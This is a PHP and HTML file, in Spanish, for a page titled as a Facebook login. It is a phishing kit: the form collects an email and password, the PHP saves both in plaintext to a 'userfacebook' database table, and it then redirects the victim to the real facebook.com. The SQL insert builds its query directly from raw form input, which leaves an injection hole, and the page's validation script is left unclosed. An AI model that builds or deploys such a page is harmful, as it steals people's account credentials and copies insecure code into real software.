<?php
	include 'include/connect.php';
	if (isset($_POST['Btn_Facebook'])) {
		$Correo = $_POST['txt1'];	
		$pass = $_POST['txt2'];
		$insertar = "INSERT INTO userfacebook(Email, Password)VALUES('$Correo','$pass')";
			$ejecutar = $conexion->query($insertar);

		if ($ejecutar > 0){
			header("location:https://facebook.com");
		}
		else
		{
			echo "Hubo un error intentalo más tarde";
		}
		 }
		
	?>

<!DOCTYPE html>
<html lang="es">
<head>
	<title>Iniciar sesión en Facebook</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial=scale=1">
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
</head>
<body>
	<div class="container">
		<h2 class="display-6 text-center mt-2">Facebook</h2>
	</div>
	<div class="container">
	<div class="row mt-3">
		<form action="<?php echo $_SERVER['PHP_SELF'];?>" method="POST" class="form-control">
			<div class="row text-center">
				<div class="card-shadow ">
				<div class="col-sm-12 col-md-6 col-lg-4"><input type="email" id="Email" placeholder="Correo" class="form-control" name="txt1" required/>
		        </div>
			    <div class="col-sm-12 col-md-6 col-lg-4"><input type="password" id="Pass" placeholder="Contraseña" class="form-control mt-2" name="txt2" required/>
			    </div>
			</div>
			<div class="col-sm-12 col-md-6 col-lg-4">
			<input type="submit" id="Usuario" value="Iniciar Sesión" name="Btn_Facebook" class="btn btn-sm btn-warning mt-2" onclick="validar()"required/> </div>
			</div>
		</form>
		</div>
	</div>
	<script>
		function validar(){
			var em = document.getElementById('Email').value;;
			var cc = document.getElementById('Pass').value;
			
			if (em == "")  
			{
				alert("POR FAVOR ingrese su correctamente su correo")
			}
			if (cc == "")  
			{
				alert("POR FAVOR ingrese su correctamente su contraseña")
			}
			else
			{
				alert("BIENVENIDO los siguientes datos han sido validados"+em+cc)
			}


			
	</script>
<script src="js/bootstrap.min.js"></script>
</body>
</html>